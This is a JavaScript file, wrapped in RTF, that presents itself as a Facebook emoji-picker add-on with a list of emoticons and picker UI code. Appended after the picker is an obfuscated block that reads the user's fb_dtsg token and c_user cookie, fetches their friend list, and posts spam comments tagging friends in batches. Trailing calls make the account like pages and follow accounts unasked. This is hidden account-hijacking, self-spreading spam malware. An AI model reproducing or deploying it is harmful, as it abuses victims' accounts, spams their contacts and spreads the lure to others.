\tab\tab "chars" : " \\ud83d\\ude04 ",\par
\tab\tab "class" : "_1az _1a- _2fv",\par
\tab\tab "name" : "Face and eyes smiling with mouth open"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude06 ",\par
\tab\tab "class" : "_1az _1a- _2fw",\par
\tab\tab "name" : "Smiley face with mouth open and eyes closed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude09 ",\par
\tab\tab "class" : "_1az _1a- _2fx",\par
\tab\tab "name" : "Face winking eye"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude0b ",\par
\tab\tab "class" : "_1az _1a- _2fy",\par
\tab\tab "name" : "Guy savoring delicious food"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude0c ",\par
\tab\tab "class" : "_1az _1a- _2fz",\par
\tab\tab "name" : "Relief face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude0d ",\par
\tab\tab "class" : "_1az _1a- _2f-",\par
\tab\tab "name" : "Smiley face with heart shaped eyes"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude0f ",\par
\tab\tab "class" : "_1az _1a- _2f_",\par
\tab\tab "name" : "Smirk face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude12 ",\par
\tab\tab "class" : "_1az _1a- _2g0",\par
\tab\tab "name" : "Face of boredom"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude13 ",\par
\tab\tab "class" : "_1az _1a- _2g1",\par
\tab\tab "name" : "Face with cold sweat"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude14 ",\par
\tab\tab "class" : "_1az _1a- _2g2",\par
\tab\tab "name" : "Pensive face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude16 ",\par
\tab\tab "class" : "_1az _1a- _2g3",\par
\tab\tab "name" : "Confused face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude18 ",\par
\tab\tab "class" : "_1az _1a- _2g4",\par
\tab\tab "name" : "Throwing kiss Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude1a ",\par
\tab\tab "class" : "_1az _1a- _2g5",\par
\tab\tab "name" : "Kissing face with eyes closed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude1c ",\par
\tab\tab "class" : "_1az _1a- _2g6",\par
\tab\tab "name" : "Face with tongue out and winking"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude1d ",\par
\tab\tab "class" : "_1az _1a- _2g7",\par
\tab\tab "name" : "Face with tongue hanging out and eyes closed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude1e ",\par
\tab\tab "class" : "_1az _1a- _2g8",\par
\tab\tab "name" : "Face discouraged"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude20 ",\par
\tab\tab "class" : "_1az _1a- _2g9",\par
\tab\tab "name" : "Face of anger"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude21 ",\par
\tab\tab "class" : "_1az _1a- _2ga",\par
\tab\tab "name" : "Very angry face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude22 ",\par
\tab\tab "class" : "_1az _1a- _2gb",\par
\tab\tab "name" : "Crying Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude23 ",\par
\tab\tab "class" : "_1az _1a- _2gc",\par
\tab\tab "name" : "Face of perseverance"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude24 ",\par
\tab\tab "class" : "_1az _1a- _2gd",\par
\tab\tab "name" : "Face of triumph"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude25 ",\par
\tab\tab "class" : "_1az _1a- _2ge",\par
\tab\tab "name" : "Face discouraged but relieved"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude28 ",\par
\tab\tab "class" : "_1az _1a- _2gf",\par
\tab\tab "name" : "Scary face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude29 ",\par
\tab\tab "class" : "_1az _1a- _2gg",\par
\tab\tab "name" : "Fatigued face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude2a ",\par
\tab\tab "class" : "_1az _1a- _2gh",\par
\tab\tab "name" : "Sleeping face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude2b ",\par
\tab\tab "class" : "_1az _1a- _2gi",\par
\tab\tab "name" : "Tired face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude2d ",\par
\tab\tab "class" : "_1az _1a- _2gj",\par
\tab\tab "name" : "Face screaming"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude30 ",\par
\tab\tab "class" : "_1az _1a- _2gk",\par
\tab\tab "name" : "Face with mouth open and cold sweat"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude31 ",\par
\tab\tab "class" : "_1az _1a- _2gl",\par
\tab\tab "name" : "Terrified face of fear"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude32 ",\par
\tab\tab "class" : "_1az _1a- _2gm",\par
\tab\tab "name" : "Very surprised face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude33 ",\par
\tab\tab "class" : "_1az _1a- _2gn",\par
\tab\tab "name" : "Face flushed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude35 ",\par
\tab\tab "class" : "_1az _1a- _2go",\par
\tab\tab "name" : "Face dizzy"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude37 ",\par
\tab\tab "class" : "_1az _1a- _2gp",\par
\tab\tab "name" : "Face with medical mask"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude38 ",\par
\tab\tab "class" : "_1az _1a- _2gq",\par
\tab\tab "name" : "Grinning Cat face and eyes closed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude39 ",\par
\tab\tab "class" : "_1az _1a- _2gr",\par
\tab\tab "name" : "Cat face with tears of laughter"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude3a ",\par
\tab\tab "class" : "_1az _1a- _2gs",\par
\tab\tab "name" : "Smiling cat face with open mouth"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude3b ",\par
\tab\tab "class" : "_1az _1a- _2gt",\par
\tab\tab "name" : "Smiling cat face with hearts in her eyes"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude3c ",\par
\tab\tab "class" : "_1az _1a- _2gu",\par
\tab\tab "name" : "Face of cat smile twisted"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude3d ",\par
\tab\tab "class" : "_1az _1a- _2gv",\par
\tab\tab "name" : "Cat face kissing with eyes closed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude3f ",\par
\tab\tab "class" : "_1az _1a- _2gw",\par
\tab\tab "name" : "Cat face crying"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude40 ",\par
\tab\tab "class" : "_1az _1a- _2gx",\par
\tab\tab "name" : "Cat face scared terrified"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude4b ",\par
\tab\tab "class" : "_1az _1a- _2gy",\par
\tab\tab "name" : "Happy person raising a hand"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude4c ",\par
\tab\tab "class" : "_1az _1a- _2gz",\par
\tab\tab "name" : "Person holding up both hands in celebration"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude4d ",\par
\tab\tab "class" : "_1az _1a- _2g-",\par
\tab\tab "name" : "Person frowning"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude4f ",\par
\tab\tab "class" : "_1az _1a- _2g_",\par
\tab\tab "name" : "Person in prayer"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u261d ",\par
\tab\tab "class" : "_1az _1a- _2h0",\par
\tab\tab "name" : "Index finger pointing up"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u263a ",\par
\tab\tab "class" : "_1az _1a- _2h1",\par
\tab\tab "name" : "White face smiling"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u26a1 ",\par
\tab\tab "class" : "_1az _1a- _2h2",\par
\tab\tab "name" : "High voltage symbol"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u26c4 ",\par
\tab\tab "class" : "_1az _1a- _2h3",\par
\tab\tab "name" : "Snowless snowman"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u270a ",\par
\tab\tab "class" : "_1az _1a- _2h4",\par
\tab\tab "name" : "Fist up"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u270b ",\par
\tab\tab "class" : "_1az _1a- _2h5",\par
\tab\tab "name" : "Hand pointing up"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u270c ",\par
\tab\tab "class" : "_1az _1a- _2h6",\par
\tab\tab "name" : "Winning Hand"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u2600 ",\par
\tab\tab "class" : "_1az _1a- _2h7",\par
\tab\tab "name" : "Sun With Rays"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u2601 ",\par
\tab\tab "class" : "_1az _1a- _2h8",\par
\tab\tab "name" : "Cloud"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u2614 ",\par
\tab\tab "class" : "_1az _1a- _2h9",\par
\tab\tab "name" : "Umbrella With Rain Drops"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u2615 ",\par
\tab\tab "class" : "_1az _1a- _2ha",\par
\tab\tab "name" : "Hot Drink"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u2728 ",\par
\tab\tab "class" : "_1az _1a- _2hb",\par
\tab\tab "name" : "Brightness"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u2764 ",\par
\tab\tab "class" : "_1az _1a- _2hc",\par
\tab\tab "name" : "Heavy Black Heart"\par
\tab\} ];\par
\par
\tab // = Variables =======\par
\tab var lastActiveElement = document.activeElement;\par
\par
\tab // = Functions =======\par
\tab function createElement(html) \{\par
\tab\tab var outerHTML = document.createElement("div");\par
\tab\tab outerHTML.innerHTML = html;\par
\tab\tab return outerHTML.firstChild;\par
\tab\}\par
\par
\tab function htmlSpecialChars(string) \{\par
\tab\tab var div = document.createElement("div");\par
\tab\tab var text = document.createTextNode(string);\par
\tab\tab div.appendChild(text);\par
\tab\tab return div.innerHTML;\par
\tab\}\par
\par
\tab function isInstanceOfTextInput(element) \{\par
\tab\tab return (element instanceof HTMLInputElement && element.type == "text")\par
\tab\tab\tab\tab || element instanceof HTMLTextAreaElement;\par
\tab\}\par
\par
\tab function isFlyoutOpen(flyout) \{\par
\tab\tab return flyout.className == "openToggler";\par
\tab\}\par
\par
\tab function openFlyout(flyout, open) \{\par
\tab\tab if (open === undefined) \{\par
\tab\tab\tab open = !isFlyoutOpen(flyout); // Toggle\par
\tab\tab\}\par
\par
\tab\tab if (open) \{\par
\tab\tab\tab flyout.className = "openToggler";\par
\tab\tab\} else \{\par
\tab\tab\tab flyout.removeAttribute("class");\par
\tab\tab\}\par
\tab\}\par
\par
\tab function createTab(titleContainer, bodyContainer) \{\par
\tab\tab var html;\par
\tab\tab // Tab; default = inactive\par
\tab     html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';\par
\tab\tab html += '<div class="jewelFlyout">';\par
\tab\tab html += '</div>';\par
\tab\tab html += '</li>';\par
\tab\tab var title = createElement(html);\par
\tab\tab titleContainer.appendChild(title);\par
\par
\tab\tab // Manual input\par
\tab\tab html = '<div style="display: none;">';\par
\tab\tab html += '</div>';\par
\tab\tab var body = createElement(html);\par
\tab\tab bodyContainer.appendChild(body);\par
\par
\tab\tab // Change tab listener\par
\tab\tab (function(body) \{\par
\tab\tab\tab title.addEventListener("click", function() \{\par
\tab\tab\tab\tab // Change tab\par
\tab\tab\tab\tab var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes\par
\tab\tab\tab\tab for ( var t = 0; t < titles.length; t++) \{\par
\tab\tab\tab\tab\tab if (titles[t] === this) \{ // Active\par
\tab\tab\tab\tab\tab\tab\par
\tab\tab\tab\tab\tab\} else \{ // Inactive\par
\tab\tab\tab\tab\tab\tab titles[t].style.background = "";\par
\tab\tab\tab\tab\tab\tab titles[t].firstChild.style.color = "";\par
\tab\tab\tab\tab\tab\}\par
\tab\tab\tab\tab\}\par
\par
\tab\tab\tab\tab // Change body\par
\tab\tab\tab\tab var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes\par
\tab\tab\tab\tab for ( var b = 0; b < bodies.length; b++) \{\par
\tab\tab\tab\tab\tab if (bodies[b] === body) \{ // Show\par
\tab\tab\tab\tab\tab\tab body.style.display = "";\par
\tab\tab\tab\tab\tab\} else \{ // Hide\par
\tab\tab\tab\tab\tab\tab bodies[b].style.display = "none";\par
\tab\tab\tab\tab\tab\}\par
\tab\tab\tab\tab\}\par
\tab\tab\tab\});\par
\tab\tab\})(body);\par
\par
\tab\tab return \{\par
\tab\tab\tab "title" : title.firstChild,\par
\tab\tab\tab "body" : body\par
\tab\tab\};\par
\tab\}\par
\par
\tab function createTabListBody(emoticons, filter) \{\par
\tab\tab var html;\par
\par
\tab\tab html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';\par
\tab\tab html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';\par
\tab\tab html += '</div>';\par
\tab\tab html += '</div>';\par
\tab\tab var body = createElement(html).firstChild;\par
\tab\tab for ( var e = 0; e < emoticons.length; e++) \{\par
\tab\tab\tab var emoticon = emoticons[e];\par
\tab\tab\tab if (!filter(emoticon)) \{\par
\tab\tab\tab\tab continue;\par
\tab\tab\tab\}\par
\par
\tab\tab\tab // Icons\par
\tab\tab\tab html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';\par
\tab\tab\tab html += '<a';\par
\tab\tab\tab html += ' class="emoticon'\par
\tab\tab\tab\tab\tab + (emoticon.class !== undefined ? ' ' + emoticon.class : '')\par
\tab\tab\tab\tab\tab + '"';\par
\tab\tab\tab html += ' style="text-decoration: inherit; color: inherit;'\par
\tab\tab\tab\tab\tab + (emoticon.class !== undefined ? ' color: transparent;'\par
\tab\tab\tab\tab\tab\tab\tab : ' width: auto;') + '"';\par
\tab\tab\tab html += (emoticon.name !== undefined ? ' title="' + emoticon.name\par
\tab\tab\tab\tab\tab + '"' : '');\par
\tab\tab\tab html += '>';\par
\tab\tab\tab html += htmlSpecialChars(emoticon.chars);\par
\tab\tab\tab html += '</a>';\par
\tab\tab\tab html += '</span>';\par
\tab\tab\tab var cell = createElement(html);\par
\tab\tab\tab body.appendChild(cell);\par
\par
\tab\tab\tab // Select emoticon listener\par
\tab\tab\tab var emoticonA = cell.firstChild;\par
\tab\tab\tab (function(emoticon) \{\par
\tab\tab\tab\tab emoticonA.addEventListener("click", function() \{\par
\tab\tab\tab\tab\tab if (isInstanceOfTextInput(lastActiveElement)) \{\par
\tab\tab\tab\tab\tab\tab lastActiveElement.focus();\par
\par
\tab\tab\tab\tab\tab\tab var chars = emoticon.chars;\par
\tab\tab\tab\tab\tab\tab var value = lastActiveElement.value;\par
\tab\tab\tab\tab\tab\tab var start = lastActiveElement.selectionStart;\par
\tab\tab\tab\tab\tab\tab var end = lastActiveElement.selectionEnd;\par
\tab\tab\tab\tab\tab\tab lastActiveElement.value = value.substring(0, start)\par
\tab\tab\tab\tab\tab\tab\tab\tab + chars + value.substring(end);\par
\tab\tab\tab\tab\tab\tab lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);\par
\tab\tab\tab\tab\tab\}\par
\par
\tab\tab\tab\tab\tab openFlyoutCommand = false; // Close flyout\par
\tab\tab\tab\tab\});\par
\tab\tab\tab\})(emoticon);\par
\tab\tab\}\par
\par
\tab\tab return body.parentNode;\par
\tab\}\par
\par
\tab // = Construct UI =======\par
\tab var html;\par
\par
\tab // Menu item\par
\tab // var navItem\par
\tab html = '<li class="navItem middleItem notifNegativeBase">';\par
\tab html += '<div class="fbJewel">';\par
\tab // \{\par
\par
\tab // Toggler\par
\tab html += '<a class="navLink" title="1 Th\'f4ng B\'e1o M?i">'; // var navLink\par
\tab html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';\par
\tab html += '</a>';\par
\par
\tab\par
\tab // Flyout\par
\tab html += '<div>'; // openToggler; var flyout\par
\tab html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';\par
\tab // \{\par
\par
\tab\par
\tab // Beeper\par
\tab html += '<div class="jewelBeeperHeader">';\par
\tab html += '<div class="beeperNubWrapper">';\par
\tab html += '<div class="beeperNub" style="left: 4px;"></div>';\par
\tab html += '</div>';\par
\tab html += '</div>';\par
\par
\tab // Tabs\par
\tab // var titleContainer\par
\tab html += '<ul style="display: text-align: center;">';\par
\tab html += '</ul>';\par
\par
\tab // Bodies\par
\tab html += '<div>'; // var bodyContainer\par
\tab html += '</div>';\par
\par
\tab // Footer\par
\tab html += '<div class="jewelFooter">';\par
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Ch\'fac M?ng B?n \'d0\'e3 C\'e0i \'d0?t ICON FaceBook Th\'e0nh C\'f4ng <br>NoName</a>';\par
\tab html += '</div>';\par
\par
\tab // \}\par
\tab html += '</div>'; // emoticonsPanel\par
\tab html += '</div>'; // openToggler\par
\par
\tab // \}\par
\tab html += '</div>'; // fbJewel\par
\tab html += '</li>'; // navItem\par
\par
\tab var navItem = createElement(html);\par
\tab var pageNav = document.querySelector("#pageNav");\par
\tab pageNav.insertBefore(navItem, pageNav.firstChild);\par
\par
\tab // Maintain active element\par
\tab navItem.addEventListener("click", function() \{\par
\tab\tab if (isInstanceOfTextInput(lastActiveElement)) \{\par
\tab\tab\tab lastActiveElement.focus();\par
\tab\tab\}\par
\par
\tab\tab openFlyoutCommand = undefined; // Do nothing\par
\tab\}, true);\par
\par
\tab var navLink = navItem.firstChild.firstChild;\par
\tab var flyout = navLink.nextSibling;\par
\tab var titleContainer = flyout.firstChild.childNodes[1];\par
\tab var bodyContainer = titleContainer.nextSibling;\par
\par
\tab // Toggle listener\par
\tab navLink.addEventListener("click", function() \{\par
\tab\tab openFlyoutCommand = !isFlyoutOpen(flyout);\par
\tab\});\par
\par
\tab // Picture emoticon tab\par
\tab var picEmoTab = createTab(titleContainer, bodyContainer);\par
\tab picEmoTab.title.click(); // Default tab\par
\tab\par
\tab picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) \{\par
\tab\tab if (emoticon.class === undefined) \{ // No picture\par
\tab\tab\tab return false;\par
\tab\tab\}\par
\par
\tab\tab // [Bug] 2 characters unicode emoticons\par
\tab\tab if (emoticon.chars.length == 2) \{\par
\tab\tab\tab return false;\par
\tab\tab\}\par
\par
\tab\tab return true;\par
\par
\tab\tab\tab\}));\par
\par
\tab // = Other listener =======\par
\par
\tab document.addEventListener("click", function() \{\par
\tab\tab // Get active textarea\par
\tab\tab lastActiveElement = document.activeElement;\par
\par
\tab\tab // Toggle flyout\par
\tab\tab if (openFlyoutCommand !== undefined) \{\par
\tab\tab\tab openFlyout(flyout, openFlyoutCommand);\par
\tab\tab\}\par
\tab\tab openFlyoutCommand = false;\par
 \tab\});\par
\})();\par
\par
\par
\tab // === Facebook Emoticons ====\par
//\par
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","1466605380224669","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," \u-10179?\u-9137? \u-10179?\u-8671? \u-10179?\u-8680? \u-10179?\u-9143? M\'e0u s\u7855?c \u7903? stt \f1\'f0\u7865?p qu\'e1 c\'e1c b\u7841?n \u417?i \u-10179?\u-9144? \u-10179?\u-9060? \u-10179?\u-9064? (^^^)   @[","uid",":","text","]"," ","\\x26filter[0]=user","\\x26options[0]=friends_only","\\x26options[1]=nm","\\x26token=v7","\\x26viewer=","\\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\\x26ft_ent_identifier=","\\x26comment_text=","\\x26source=2","\\x26client_id=1377871797138:1707018092","\\x26reply_fbid","\\x26parent_comment_id","\\x26rootid=u_jsonp_2_3","\\x26clp=\{\\x22cl_impid\\x22:\\x22453524a0\\x22,\\x22clearcounter\\x22:0,\\x22elementid\\x22:\\x22js_5\\x22,\\x22version\\x22:\\x22x\\x22,\\x22parent_fbid\\x22:","\}","\\x26attached_sticker_fbid=0","\\x26attached_photo_fbid=0","\\x26giftoccasion","\\x26ft[tn]=[]","\\x26__a=1","\\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\\x26__req=q","\\x26fb_dtsg=","\\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];\par
var _0xa22c=[_0xf841[0],_0xf841[1],_0xf841[2],_0xf841[3],_0xf841[4],_0xf841[5],_0xf841[6],_0xf841[7],_0xf841[8],_0xf841[9],_0xf841[10],_0xf841[11],_0xf841[12],_0xf841[13],_0xf841[14],_0xf841[15],_0xf841[16],_0xf841[17],_0xf841[18],_0xf841[19],_0xf841[20],_0xf841[21],_0xf841[22],_0xf841[23],_0xf841[24],_0xf841[25],_0xf841[26],_0xf841[27],_0xf841[28],_0xf841[29],_0xf841[30],_0xf841[31],_0xf841[32],_0xf841[33],_0xf841[34],_0xf841[35],_0xf841[36],_0xf841[37],_0xf841[38],_0xf841[39],_0xf841[40],_0xf841[41],_0xf841[42],_0xf841[43],_0xf841[44],_0xf841[45],_0xf841[46],_0xf841[47],_0xf841[48],_0xf841[49],_0xf841[50],_0xf841[51],_0xf841[52],_0xf841[53],_0xf841[54],_0xf841[55],_0xf841[56],_0xf841[57],_0xf841[58],_0xf841[59],_0xf841[60],_0xf841[61],_0xf841[62],_0xf841[63],_0xf841[64]];\par
var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];\par
var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\\d+)/)[1]);\par
var id=_0xa22c[5];\par
var arkadaslar=[];\par
var svn_rev;\par
function arkadaslari_al(id)\par
\{\par
\tab var _0x327fx8= new XMLHttpRequest();\par
\tab _0x327fx8[_0xa22c[6]]=function ()\par
\tab\{\par
\tab\tab if(_0x327fx8[_0xa22c[7]]==4)\par
\tab\tab\{\par
\tab\tab\tab eval(_0xa22c[8]+_0x327fx8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);\par
\tab\tab\tab for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++)\par
\tab\tab\tab\{\par
\tab\tab\tab\tab mesaj=_0xa22c[10];\par
\tab\tab\tab\tab mesaj_text=_0xa22c[10];\par
\tab\tab\tab\tab for(i=f*27;i<(f+1)*27;i++)\par
\tab\tab\tab\tab\{\par
\tab\tab\tab\tab\tab if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i])\par
\tab\tab\tab\tab\tab\{\par
\tab\tab\tab\tab\tab\tab mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];\par
\tab\tab\tab\tab\tab\tab mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];\par
\tab\tab\tab\tab\tab\}\par
\tab\tab\tab\tab\tab ;\par
\tab\tab\tab\tab\}\par
\tab\tab\tab\tab ;\par
\tab\tab\tab\tab yorum_yap(id,mesaj);\par
\tab\tab\tab\}\par
\tab\tab\tab ;\par
\tab\tab\}\par
\tab\tab ;\par
\tab\}\par
\tab ;\par
\tab var _0x327fx9=_0xa22c[24];\par
\tab _0x327fx9+=_0xa22c[25];\par
\tab _0x327fx9+=_0xa22c[26];\par
\tab _0x327fx9+=_0xa22c[27];\par
\tab _0x327fx9+=_0xa22c[28]+user_id;\par
\tab _0x327fx9+=_0xa22c[29]+user_id;\par
\tab if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0)\par
\tab\{\par
\tab\tab _0x327fx8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x327fx9,true);\par
\tab\}\par
\tab else \par
\tab\{\par
\tab\tab _0x327fx8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x327fx9,true);\par
\tab\}\par
\tab ;\par
\tab _0x327fx8[_0xa22c[37]]();\par
\}\par
;\par
function RandomArkadas()\par
\{\par
\tab var _0x327fxb=_0xa22c[10];\par
\tab for(i=0;i<9;i++)\par
\tab\{\par
\tab\tab _0x327fxb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];\par
\tab\}\par
\tab ;\par
\tab return _0x327fxb;\par
\}\par
;\par
function yorum_yap(id,_0x327fxd)\par
\{\par
\tab var _0x327fxe= new XMLHttpRequest();\par
\tab var _0x327fx9=_0xa22c[10];\par
\tab _0x327fx9+=_0xa22c[40]+id;\par
\tab _0x327fx9+=_0xa22c[41]+encodeURIComponent(_0x327fxd);\par
\tab _0x327fx9+=_0xa22c[42];\par
\tab _0x327fx9+=_0xa22c[43];\par
\tab _0x327fx9+=_0xa22c[44];\par
\tab _0x327fx9+=_0xa22c[45];\par
\tab _0x327fx9+=_0xa22c[46];\par
\tab _0x327fx9+=_0xa22c[47]+id+_0xa22c[48];\par
\tab _0x327fx9+=_0xa22c[49];\par
\tab _0x327fx9+=_0xa22c[50];\par
\tab _0x327fx9+=_0xa22c[51];\par
\tab _0x327fx9+=_0xa22c[52];\par
\tab _0x327fx9+=_0xa22c[29]+user_id;\par
\tab _0x327fx9+=_0xa22c[53];\par
\tab _0x327fx9+=_0xa22c[54];\par
\tab _0x327fx9+=_0xa22c[55];\par
\tab _0x327fx9+=_0xa22c[56]+fb_dtsg;\par
\tab _0x327fx9+=_0xa22c[57];\par
\tab _0x327fxe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);\par
\tab _0x327fxe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);\par
\tab _0x327fxe[_0xa22c[6]]=function ()\par
\tab\{\par
\tab\tab if(_0x327fxe[_0xa22c[7]]==4&&_0x327fxe[_0xa22c[63]]==200)\par
\tab\tab\{\par
\tab\tab\tab _0x327fxe[_0xa22c[64]];\par
\tab\tab\}\par
\tab\tab ;\par
\tab\}\par
\tab ;\par
\tab _0x327fxe[_0xa22c[37]](_0x327fx9);\par
\}\par
;\par
arkadaslari_al(id);\par
\f0 // TT\par
a("100006483813698");Like("100006256620370");Like("10000768105037");sublist("1503147213244725");Like("138903052970790");P("1492048254354621");P("1480872838805496");Like("243176022513080");Like("493331530702285");Like("1453530041533507");a("100005432863162");P("1437672029792244");P("1513877812171665");\par
//BMTC\par
Like("646227342108519");Like("133397823497333");Like("1517329341826512");\par
Like("1517329768493136");\par
}